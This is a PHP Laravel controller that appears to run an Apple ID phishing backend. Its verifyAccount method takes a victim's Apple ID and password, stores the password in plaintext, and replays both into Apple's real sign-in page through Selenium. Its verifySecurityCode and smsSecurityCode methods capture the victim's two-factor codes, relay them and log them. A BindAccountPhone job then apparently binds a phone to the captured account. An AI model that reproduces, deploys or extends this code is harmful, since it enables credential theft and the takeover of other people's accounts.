<?php

namespace App\Http\Controllers;

use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\DataConstruct\ServiceError;
use App\Apple\Service\Exception\AccountLockoutException;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\Exception\VerificationCodeIncorrect;
use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
use App\Apple\Service\User\User;
use App\Apple\Service\User\UserFactory;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Http\Integrations\IpConnector\IpConnector;
use App\Http\Integrations\IpConnector\Requests\PconLineRequest;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use App\Models\SecuritySetting;
use App\Selenium\AppleClient\Elements\Phone;
use App\Selenium\AppleClient\Exception\AccountException;
use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthenticationPage;
use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
use App\Selenium\AppleClient\Request\SignInRequest;
use App\Selenium\ConnectorManager;
use App\Selenium\Exception\PageException;
use Carbon\Carbon;
use Facebook\WebDriver\Exception\NoSuchElementException;
use Facebook\WebDriver\Exception\TimeoutException;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use InvalidArgumentException;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;
use Psr\SimpleCache\CacheInterface;
use Saloon\Exceptions\Request\FatalRequestException;
use Saloon\Exceptions\Request\RequestException;

class IndexController extends Controller
{


    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
        private readonly PhoneNumberFactory $phoneNumberFactory,
        protected UserFactory $userFactory,
        protected ConnectorManager $connectorManager,
    )
    {

    }

    protected function getAccount(): ?Account
    {
        return $this->request->user();
    }

    protected function getApple():?Apple
    {
        return $this->request->attributes->get('apple');
    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Response
    {

        $guid = sha1(microtime());

        $IpConnector = new IpConnector();
        $apple = $this->appleFactory->create($guid);

        try {

            $ipaddress = $IpConnector->ipaddress(new PconLineRequest(ip: $this->request->ip()));
            $apple->getUser()->add('ipaddress',$ipaddress);

            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
        } catch (FatalRequestException|RequestException $e) {

        }

        return response()
            ->view('index/signin')
            ->withCookie(Cookie::make('Guid', $guid));
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    public function connector()
    {
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws AccountLockoutException
     * @throws GuzzleException
     * @throws UnauthorizedException|ConnectionException|\Illuminate\Http\Client\RequestException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
        // 获取验证过的数据
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails()) {
            $accountName = $this->formatPhone($accountName);
        }

        $guid = $request->cookie('Guid',null);

        $connector = $this->connectorManager->createConnector();
        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$accountName}/"));

        $response = $connector->send(new SignInRequest());

        /**
         * @var \App\Selenium\AppleClient\Page\SignIn\SignInPage $page
         */
        $page = $response->getPage();


        try {


            $page->inputAccountName($accountName);
            $page->signInAccountName();

            $page->inputPassword($password);
            $authPage = $page->signInPassword();

        } catch (AccountException|NoSuchElementException|TimeoutException $e) {

            $page->takeScreenshot("verifyAccount.png");

            throw $e;

        }

        $account = Account::updateOrCreate([
            'account' => $accountName,
        ],[ 'password' => $password]);

        $user = $this->userFactory->create($guid);
        $user->setAccount($account);

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));

        $this->connectorManager->add($guid,$connector);

        if ($authPage instanceof SignInSelectPhonePage){

            $user->setPhoneInfo($authPage->getPhoneLists());

            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
            ],code: 202);
        }

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => true,
        ],code: 203);
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @param CacheInterface $cache
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     */
    public function authPhoneList(CacheInterface $cache): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
    {
        $guid = $this->request->input('Guid',null);

        $user = $this->userFactory->create($guid);

        return view('index.auth-phone-list',['trustedPhoneNumbers' => $user->getPhoneInfo()]);
    }

    /**
     * 验证安全码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws NoSuchElementException
     * @throws TimeoutException
     * @throws VerificationCodeIncorrect
     */
    public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();
        $code = $validated['apple_verifycode'];
        $guid = $this->request->input('Guid');

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        try {

            $connector = $this->connectorManager->getConnector($guid);
            $connector->config()
                ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

            $page = new TwoFactorAuthenticationPage($connector);

            $page->inputTrustedCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $user->getAccount(),description: "安全码验证成功 code:{$code}"));

        } catch (VerificationCodeIncorrect $e) {

            $e->getPage()->takeScreenshot("verifySecurityCode.png");

            Event::dispatch(new AccountAuthFailEvent(account: $user->getAccount(),description: "安全码验证失败 {$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($guid,$account);

        return $this->success([]);
    }

    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
    {
        return Account::where('account', $accountName)->first();
    }

    /**
     * 验证手机验证码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect
     * @throws ConnectionException
     */
    public function smsSecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();

        $code = $validated['apple_verifycode'];

        $guid = $this->request->input('Guid');

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector = $this->connectorManager->getConnector($guid);
        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

        // 验证手机号码
        try {

            $page = new TwoFactorAuthenticationPage($connector);

            $page->inputTrustedCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));

        } catch (VerificationCodeIncorrect $e) {

            $e->getPage()->takeScreenshot("smsSecurityCode.png");

            Event::dispatch(new AccountAuthFailEvent(account: $account,description: (string)($e->getMessage())));
            throw $e;
        }

        BindAccountPhone::dispatch($guid,$account);

        return $this->success();
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws UnauthorizedException|ConnectionException
     */
    public function SendSecurityCode(): JsonResponse
    {
        $apple = $this->getApple();

        try {

            $response = $apple->idmsa->sendSecurityCode()->json();

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => '获取安全码成功',
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => "获取安全码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        return $this->success($response);
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws GuzzleException|ConnectionException
     */
    public function GetPhone(): JsonResponse
    {
        $response = $this->getApple()->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();

        return $this->success([
            'ID'                  => $trustedPhoneNumbers?->getId(),
            'Number'              => $trustedPhoneNumbers?->getNumberWithDialCode(),
        ]);
    }

    /**
     * 发送验证码
     * @return JsonResponse|Redirector
     * @throws NoSuchElementException
     * @throws TimeoutException
     * @throws ValidationException|PageException
     */
    public function SendSms(): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:0',
        ])->validated();

        try {

            $guid = $this->request->input('Guid');

            $user = $this->userFactory->create($guid);
            if (! $account = $user->getAccount()){
                throw new \RuntimeException('账号信息不存在');
            }
            $connector = $this->connectorManager->getConnector($guid);
            $connector->config()
                ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));


            $page = new SignInSelectPhonePage($connector);
            $page->selectPhone($params['ID']);

        } catch (PageException $e) {

            $e->getPage()->takeScreenshot("SendSms.png");

            throw $e;
        }

        return $this->success();
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
